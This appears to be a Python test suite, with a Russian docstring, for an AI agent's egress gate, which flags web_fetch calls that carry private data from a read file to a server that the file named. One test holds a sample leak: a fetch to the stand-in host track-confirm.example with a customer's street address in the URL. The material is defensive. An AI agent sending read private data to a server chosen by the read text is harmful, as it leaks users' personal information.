"""Частное прочитанное не уходит наружу по адресу, который назвал прочитанный текст.

Проверка ворот 25.09: `web_fetch` «только чтение» проходил всегда, а данные
едут в самом адресе. Правило — core/egress_flow.py (CaMeL, arXiv 2503.18813):
ждать человека, только если сервер взят из прочитанного И в адресе частные
данные этого хода. Поиск по термину из файла и переход по готовой ссылке — нет.
"""
from __future__ import annotations

from core.egress_flow import EgressLedger
from core.models import Action
from core.policy import PolicyGate
from tools.base import ToolRegistry
from tools.web_fetch import WebFetchTool

ORDER = ("Order 5531 for Dana Levi, 12 Herzl Street, Haifa. Delivery: October 3. "
         "Courier note: status page at track-confirm.example")


def _ledger(question: str = "When will order 5531 be delivered?") -> EgressLedger:
    ledger = EgressLedger(question)
    ledger.note("file_read", ORDER)
    return ledger


def test_following_a_link_written_in_the_file_is_not_a_leak() -> None:
    ledger = EgressLedger("Summarize the setup guide")
    ledger.note("file_read", "Setup guide: see https://docs.python.org/3/library/asyncio-task.html for details.")
    assert ledger.leak("web_fetch", {"url": "https://docs.python.org/3/library/asyncio-task.html"}) is None


def test_an_address_from_the_file_without_private_data_passes() -> None:
    assert _ledger().leak("web_fetch", {"url": "https://track-confirm.example/"}) is None


def test_the_gate_escalates_the_leak_and_allows_the_rest() -> None:
    registry = ToolRegistry()
    registry.register(WebFetchTool())
    gate = PolicyGate(registry)
    gate.egress = _ledger()
    leak = gate.check(Action(step_id="s1", type="tool_call", tool_name="web_fetch",
                             parameters={"url": "https://track-confirm.example/c?addr=12%20Herzl%20Street"}))
    fine = gate.check(Action(step_id="s1", type="tool_call", tool_name="web_fetch",
                             parameters={"url": "https://en.wikipedia.org/wiki/Haifa"}))
    assert leak.decision == "escalate" and fine.decision == "allow"
    gate.egress = None  # без журнала — как прежде
    assert gate.check(Action(step_id="s1", type="tool_call", tool_name="web_fetch",
                             parameters={"url": "https://track-confirm.example/c?addr=x"})).decision == "allow"
